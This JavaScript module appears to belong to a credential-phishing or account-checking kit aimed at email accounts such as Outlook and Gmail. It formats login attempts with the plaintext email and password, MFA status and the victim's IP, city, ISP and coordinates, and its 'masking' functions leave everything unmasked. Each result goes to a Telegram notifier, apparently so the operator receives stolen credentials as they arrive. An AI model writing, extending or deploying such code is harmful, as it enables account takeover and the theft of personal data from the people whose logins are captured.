const { notifyTelegramOnSuccess } = require("./telegramNotifier");

const personalDomains = new Set([
  "outlook.com",
  "hotmail.com",
  "live.com",
  "msn.com",
  "gmail.com",
  "yahoo.com",
]);

function maskEmail(email) {
  const [localPart, domain] = String(email || "").split("@");
  if (!localPart || !domain) return "";

  return email;
}

function maskPassword(password) {
  if (!password) return "";
  return password; // Replace with actual password masking logic if needed
}

function inferAccountType(email, result) {
  if (result.accountType) return result.accountType;

  const domain = String(email || "").split("@")[1];
  if (!domain) return "unknown";
  return personalDomains.has(domain.toLowerCase()) ? "personal" : "business";
}

function inferStatus(result) {
  if (result.status) return result.status;
  if (result.mfaRequired) return "mfa_required";
  return result.success ? "success" : "failed";
}

function formatLoginResultMessage(result) {
  const statusEmoji = result.success ? "✅" : "❌";
  const mfaEmoji = result.mfaRequired ? "🔐" : "🔓";

  const lines = [
    `${statusEmoji} *Login Result*`,
    "",
    `*Status:* \`${result.status.toUpperCase()}\``,
    `*Account Type:* ${result.accountType}`,
    `*Email:* \`${result.email}\``,
    `*MFA Required:* ${mfaEmoji} ${result.mfaRequired ? "Yes" : "No"}`,
    "",
    `*Browser:* ${result.browser}`,
    `*Method:* ${result.method}`,
    `*Checked At:* \`${new Date(result.checkedAt).toLocaleString()}\``,
  ];

  if (result.message) {
    lines.push(`*Message:* ${result.message}`);
  }

  lines.push("");
  lines.push("*📍 Geolocation*");

  if (result.ip) {
    lines.push(`*IP:* \`${result.ip}\``);
  }
  if (result.country) {
    lines.push(`*Country:* ${result.country}`);
  }
  if (result.city) {
    lines.push(`*City:* ${result.city}`);
  }
  if (result.isp) {
    lines.push(`*ISP:* ${result.isp}`);
  }
  if (result.timezone) {
    lines.push(`*Timezone:* ${result.timezone}`);
  }
  if (result.latitude && result.longitude) {
    lines.push(`*Coordinates:* \`${result.latitude}, ${result.longitude}\``);
  }

  return lines.join("\n");
}

function formatLoginResult(result, email, password, options = {}) {
  const status = inferStatus(result);
  const mfaRequired = Boolean(result.mfaRequired || status === "mfa_required");

  



    const formattedResult = {
    status,
    success: status === "success",
    email: maskEmail(email),
    password: maskPassword(password),
    accountType: inferAccountType(email, result),
    mfaRequired,
    browser: options.browser || "Chrome",
    checkedAt: new Date().toISOString(),
    method: options.method || result.method || "unknown",
    message: result.message || "",
    // Geolocation info
    ip: options.ip || null,
    country: options.country || null,
    city: options.city || null,
    latitude: options.latitude || null,
    longitude: options.longitude || null,
    isp: options.isp || null,
    timezone: options.timezone || null,
  };

  // Notify Telegram immediately after formatting
  notifyTelegramOnSuccess(formattedResult);

  return formattedResult;
}

module.exports = {
  formatLoginResult,
  inferAccountType,
  maskEmail,
  maskPassword,
  formatLoginResultMessage
};
